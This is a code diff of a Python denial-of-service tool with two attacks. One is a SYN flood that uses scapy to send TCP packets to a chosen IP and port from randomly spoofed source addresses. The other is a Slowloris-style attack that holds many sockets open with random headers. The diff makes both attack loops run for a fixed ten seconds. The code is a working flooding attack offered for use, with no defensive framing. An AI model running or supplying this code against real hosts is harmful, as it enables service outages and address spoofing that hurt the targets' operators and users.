@@ -3,9 +3,7 @@
 import random
 import threading
 from scapy.all import IP, TCP, send
-import sys
-import argparse
-import logging
+import time
 import socket
 
 choose = input('')
@@ -22,13 +20,13 @@ class Synflood:
         self.packet = pack
 
     def start(self, port="80"):
+        t_end = time.time() + 10
         self.event.set()
-        while self.event.is_set():
+        while time.time() < t_end:
             for i in range(self.packet):
                 fake_ip = "%d.%d.%d.%d" % (random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
                 rand_port = random.randint(0, 65535)
                 send(IP(src=fake_ip, dst=self.target) / TCP(sport=rand_port, dport=self.port), verbose=0)
-            self.event.clear()
         print("Thread finished\n")
 
     def sf(self):
@@ -85,6 +83,7 @@ if choose == '1':
     except KeyboardInterrupt:
         syn.stop()
 elif choose == '2':
+    t_end = time.time() + 10
     ip = input('IP: ')
     port = int(input('Port: '))
     sockk = int(input('Number of sockets: '))
@@ -97,7 +96,7 @@ elif choose == '2':
         except socket.error:
             break
         list_of_sockets.append(sock)
-    for i in range(packk):
+    while time.time() < t_end:
         for sock in list(list_of_sockets):
             try:
                 lor.send_header(sock, "X-a", str(random.randint(1, 5000)))
